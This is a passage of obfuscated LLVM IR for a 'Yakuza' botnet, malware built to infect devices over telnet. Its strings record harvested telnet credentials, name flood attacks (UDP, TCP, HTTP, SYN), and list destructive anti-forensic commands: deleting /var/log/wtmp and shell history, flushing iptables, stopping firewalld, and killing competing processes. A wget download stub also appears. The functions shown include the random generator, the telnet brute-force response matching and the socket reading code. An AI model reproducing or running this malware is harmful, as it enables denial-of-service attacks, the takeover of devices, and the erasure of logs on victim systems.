@.str.123 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.124 = private unnamed_addr constant [84 x i8] c"[ Yakuza ] Infection Success || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.125 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.126 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.127 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.128 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.129 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.130 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.131 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.132 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.133 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.134 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.136 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.137 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.138 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.139 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.140 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.141 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.142 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.143 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.144 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.145 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.146 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.147 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.148 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.149 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.150 = private unnamed_addr constant [13 x i8] c"YakuzaBotnet\00", align 1
@.str.151 = private unnamed_addr constant [13 x i8] c"Scarface1337\00", align 1
@.str.152 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.153 = private unnamed_addr constant [5 x i8] c"USYN\00", align 1
@.str.154 = private unnamed_addr constant [5 x i8] c"ASYN\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.157 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.158 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.161 = private unnamed_addr constant [4 x i8] c"URG\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.163 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [285 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.165 = private unnamed_addr constant [48 x i8] c"Yakuza Botnet HTTP Flood In Progress. Fuck you.\00", align 1
@.str.166 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.167 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.169 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.170 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.171 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.173 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.174 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.175 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.176 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.177 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.179 = private unnamed_addr constant [45 x i8] c"wget --no-check-certificate -q -O /tmp/null \00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.181 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.182 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.185 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.186 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.187 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.189 = private unnamed_addr constant [8 x i8] c"HTTPTXT\00", align 1
@.str.190 = private unnamed_addr constant [5 x i8] c"WGET\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.192 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.193 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.196 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.199 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.201 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.202 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.203 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.197 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.198 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.204 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.206 = private unnamed_addr constant [55 x i8] c"[\1B[96mBOT JOINED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.207 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 1179976548, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1179976548, label %10
    i32 -896605476, label %14
    i32 936439989, label %32
    i32 -1268802947, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -896605476, i32 -1268802947
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 936439989, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 1179976548, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 76388378, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 76388378, label %first
    i32 -1308480107, label %30
    i32 1513282505, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1308480107, i32 1513282505
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 1513282505, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -989898117, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -989898117, label %8
    i32 -532328491, label %17
    i32 -1194915562, label %18
    i32 -1825977161, label %19
    i32 706347824, label %24
    i32 -1988740412, label %34
    i32 1197334818, label %35
    i32 -2083631406, label %36
    i32 462551749, label %39
    i32 1895208075, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 -532328491, i32 -1194915562
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -989898117, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1825977161, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 706347824, i32 462551749
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 -1988740412, i32 1197334818
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1895208075, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 -2083631406, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -1825977161, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1895208075, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -466512068, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -466512068, label %first
    i32 -1067131931, label %7
    i32 1687891734, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 1687891734, i32 -1067131931
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 1687891734, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 350464843, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 350464843, label %18
    i32 -339378191, label %27
    i32 1182764011, label %44
    i32 -408413592, label %45
    i32 -1300524793, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 -339378191, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 1182764011, i32 -408413592
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -1300524793, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 -1300524793, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 812015791, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 812015791, label %first
    i32 -1224444314, label %28
    i32 1294848, label %32
    i32 1135511582, label %38
    i32 -142627548, label %39
    i32 -744274599, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 -1224444314, i32 1294848
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 1294848, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1135511582, i32 -142627548
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -744274599, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -744274599, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
